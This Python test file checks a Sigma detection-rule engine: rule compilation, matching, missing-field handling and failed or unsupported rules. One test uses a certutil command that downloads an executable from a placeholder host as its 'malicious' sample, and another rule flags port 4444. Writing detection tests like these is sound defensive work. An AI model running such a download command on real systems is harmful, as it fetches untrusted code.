"""Sigma compilation, execution, conversion-error handling, and null-field safety."""

from __future__ import annotations

from datetime import UTC, datetime
from pathlib import Path

from copley.rules.engine import compile_rules, run_rules
from copley.rules.manifest import default_manifest_path, load_rule_manifest
from copley.schemas import TASK_PROCESS_EXECUTION, EvidenceWindow, ProcessEvent

_T = datetime(2026, 10, 1, 12, 0, tzinfo=UTC)


def _win(wid, cmd, image=None, ofn=None):
    ev = ProcessEvent(
        event_id=f"{wid}-e0",
        timestamp=_T,
        observed_at=_T,
        command_line=cmd,
        image=image,
        original_file_name=ofn,
    )
    return EvidenceWindow(
        window_id=wid,
        task_id=TASK_PROCESS_EXECUTION,
        as_of=_T,
        anchor_event_id=ev.event_id,
        events=[ev],
    )


def _compiled():
    entries = load_rule_manifest(default_manifest_path())
    return compile_rules([e.path for e in entries])


def test_all_manifest_rules_compile():
    compiled = _compiled()
    assert len(compiled) == 8
    assert all(c.status == "ok" for c in compiled), [
        (c.title, c.detail) for c in compiled if c.status != "ok"
    ]


def test_malicious_matches_benign_does_not():
    compiled = _compiled()
    mal = _win(
        "mal", "certutil.exe -urlcache -split -f http://x/a.exe a.exe", image="C:\\certutil.exe"
    )
    ben = _win("ben", "git status", image="C:\\Program Files\\Git\\git.exe")
    res = run_rules([mal, ben], compiled)
    assert res.matched("mal")
    assert not res.matched("ben")


def test_missing_field_is_not_a_match():
    # A window with only a command line must not crash rules referencing Image/OriginalFileName.
    compiled = _compiled()
    w = _win("w", "whoami")  # no image, benign plain whoami (not /all)
    res = run_rules([w], compiled)
    # Should execute cleanly; plain whoami should not match the "all info" rule.
    assert not res.matched("w")


def test_conversion_failure_not_negative_match(tmp_path: Path):
    bad = tmp_path / "bad.yml"
    bad.write_text(
        "title: Bad\nid: 11111111-1111-4111-8111-111111111111\n"
        "logsource: {category: process_creation, product: windows}\n"
        "detection:\n  sel: {CommandLine|contains: x}\n  condition: sel and missing\n",
        encoding="utf-8",
    )
    compiled = compile_rules([bad])
    assert compiled[0].status == "conversion_failed"
    assert compiled[0].detail
    # Failed rule must be excluded from matching, not treated as a negative/benign match.
    res = run_rules([_win("w", "x")], compiled)
    assert res.failed_rules
    assert not res.matched("w")


def test_unsupported_logsource_flagged(tmp_path: Path):
    r = tmp_path / "net.yml"
    r.write_text(
        "title: Net\nid: 22222222-2222-4222-8222-222222222222\n"
        "logsource: {category: network_connection, product: windows}\n"
        "detection:\n  sel: {DestinationPort: 4444}\n  condition: sel\n",
        encoding="utf-8",
    )
    compiled = compile_rules([r])
    assert compiled[0].status == "unsupported"
